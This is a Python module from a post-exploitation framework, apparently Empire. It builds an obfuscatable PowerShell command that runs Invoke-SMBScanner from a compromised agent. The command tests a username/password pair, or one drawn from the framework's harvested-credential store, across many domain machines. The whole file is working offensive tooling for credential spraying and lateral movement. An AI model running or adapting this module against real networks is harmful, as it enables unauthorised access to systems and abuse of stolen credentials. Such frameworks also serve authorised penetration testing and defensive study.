from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Invoke-SMBScanner',

            'Author': ['@obscuresec', '@harmj0y'],

            'Description': ('Tests a username/password combination across a number of machines.'),

            'Background' : True,

            'OutputExtension' : None,
            
            'NeedsAdmin' : False,

            'OpsecSafe' : False,

            'Language' : 'powershell',

            'MinLanguageVersion' : '2',
            
            'Comments': [
                'https://gist.github.com/obscuresec/df5f652c7e7088e2412c'
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'CredID' : {
                'Description'   :   'CredID from the store to use.',
                'Required'      :   False,
                'Value'         :   ''                
            },
            'ComputerName' : {
                'Description'   :   'Comma-separated hostnames to try username/password combinations against. Otherwise enumerate the domain for machines.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'Password' : {
                'Description'   :   'Password to test.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'UserName' : {
                'Description'   :   '[domain\]username to test.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'NoPing' : {
                'Description'   :   'Switch. Don\'t ping hosts before enumeration.',
                'Required'      :   False,
                'Value'         :   ''
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self, obfuscate=False, obfuscationCommand=""):
        
        # read in the common module source code
        moduleSource = self.mainMenu.installPath + "/data/module_source/situational_awareness/network/Invoke-SmbScanner.ps1"
        if obfuscate:
            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
        try:
            f = open(moduleSource, 'r')
        except:
            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
            return ""

        moduleCode = f.read()
        f.close()

        script = moduleCode + "\n"
        scriptEnd = ""
        # if a credential ID is specified, try to parse
        credID = self.options["CredID"]['Value']
        if credID != "":
            
            if not self.mainMenu.credentials.is_credential_valid(credID):
                print helpers.color("[!] CredID is invalid!")
                return ""

            (credID, credType, domainName, userName, password, host, os, sid, notes) = self.mainMenu.credentials.get_credentials(credID)[0]

            if domainName != "":
                self.options["UserName"]['Value'] = str(domainName) + "\\" + str(userName)
            else:
                self.options["UserName"]['Value'] = str(userName)
            if password != "":
                self.options["Password"]['Value'] = password


        if self.options["UserName"]['Value'] == "" or self.options["Password"]['Value'] == "":
            print helpers.color("[!] Username and password must be specified.")


        if (self.options['ComputerName']['Value'] != ''):
            usernames = "\"" + "\",\"".join(self.options['ComputerName']['Value'].split(",")) + "\""
            scriptEnd += usernames + " | "
        
        scriptEnd += "Invoke-SMBScanner "

        for option,values in self.options.iteritems():
            if option.lower() != "agent" and option.lower() != "computername" and option.lower() != "credid":
                if values['Value'] and values['Value'] != '':
                    if values['Value'].lower() == "true":
                        # if we're just adding a switch
                        scriptEnd += " -" + str(option)
                    else:
                        scriptEnd += " -" + str(option) + " '" + str(values['Value']) + "'" 

        scriptEnd += "| Out-String | %{$_ + \"`n\"};"
        scriptEnd += "'Invoke-SMBScanner completed'"
        if obfuscate:
            scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
        script += scriptEnd
        return script
